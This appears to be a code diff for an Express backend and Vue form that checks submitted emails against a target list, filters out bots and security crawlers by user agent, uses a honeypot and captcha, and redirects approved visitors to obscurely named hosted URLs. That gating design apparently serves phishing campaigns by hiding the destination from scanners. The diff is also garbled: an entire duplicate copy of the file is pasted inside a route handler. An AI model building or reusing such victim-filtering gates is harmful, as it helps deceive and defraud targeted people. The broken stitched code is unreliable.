@@ -65,8 +65,75 @@ function isBot(req) {
 }
 
 // API email verification
+app.post('/api/check-email', async (req, res) => {// 📁 backend/index.js
+require('dotenv').config()
+const express = require('express')
+const cors = require('cors')
+const fs = require('fs')
+const path = require('path')
+const fetch = require('node-fetch')
+const crypto = require('crypto')
+const helmet = require('helmet')
+const rateLimit = require('express-rate-limit')
+
+const app = express()
+const PORT = process.env.PORT || 3000
+const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt')
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app'
+const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app'
+const DEBUG = process.env.DEBUG === 'true'
+
+let validEmails = new Set()
+let tokenMap = new Map()
+
+function loadEmails() {
+  try {
+    const data = fs.readFileSync(EMAIL_FILE, 'utf8')
+    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()))
+    console.log('[INFO] Email list loaded')
+  } catch (err) {
+    console.error('[ERROR] Failed to load emails:', err)
+  }
+}
+loadEmails()
+
+setInterval(() => {
+  const now = Date.now()
+  for (const [token, info] of tokenMap.entries()) {
+    if (info.expires < now) {
+      tokenMap.delete(token)
+      DEBUG && console.log(`[INFO] Expired token ${token} cleared`)
+    }
+  }
+}, 5 * 60 * 1000)
+
+// Middleware
+app.use(helmet())
+app.use(express.json())
+app.use(cors({ origin: 'https://fropnvironmeropr.up.railway.app' }))
+app.use(express.static(path.join(__dirname, '../frontend/public')))
+
+app.use((req, res, next) => {
+  if (req.headers['x-forwarded-proto'] !== 'https') {
+    return res.redirect(`https://${req.headers.host}${req.url}`)
+  }
+  next()
+})
+
+app.use(rateLimit({
+  windowMs: 60 * 1000,
+  max: 50,
+  message: { valid: false, message: 'Too many requests. Try again later.' }
+}))
+
+// Bot detection function
+function isBot(req) {
+  const ua = (req.headers['user-agent'] || '').toLowerCase()
+  return !ua || /bot|crawl|spider|headless|python|scrapy|wget|curl/.test(ua)
+}
+
 app.post('/api/check-email', async (req, res) => {
-  const { email, middleName } = req.body
+  const { email, captchaToken, middleName } = req.body
 
   if (middleName && middleName.trim() !== '') {
     return res.redirect('/lalaland.html')
@@ -77,7 +144,25 @@ app.post('/api/check-email', async (req, res) => {
   }
 
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    return res.status(400).json({ valid: false, message: 'Invalid email' })
+    return res.status(400).json({ valid: false, message: 'Enter a valid email address' })
+  }
+
+  if (!captchaToken) {
+    return res.status(400).json({ valid: false, message: 'Captcha missing' })
+  }
+
+  try {
+    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
+    })
+    const result = await verify.json()
+    if (!result.success) {
+      return res.redirect('/lalaland.html')
+    }
+  } catch (err) {
+    return res.status(500).json({ valid: false, message: 'Captcha verification error' })
   }
 
   const normalized = email.toLowerCase()
@@ -120,3 +205,30 @@ app.get('/lalaland.html', (req, res) => {
 app.listen(PORT, () => {
   console.log(`[READY] Backend running on port ${PORT}`)
 })
+
+
+// 📁 frontend/src/App.vue (excerpt only - script setup)
+// Injected fetch logic inside submitForm()
+
+const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    email: email.value,
+    captchaToken: captchaToken.value,
+    middleName: honeypot.value
+  })
+})
+
+if (res.redirected) {
+  window.location.href = res.url
+  return
+}
+
+const data = await res.json()
+if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
+if (data.redirectUrl) {
+  setTimeout(() => {
+    window.location.href = data.redirectUrl
+  }, 1500)
+}
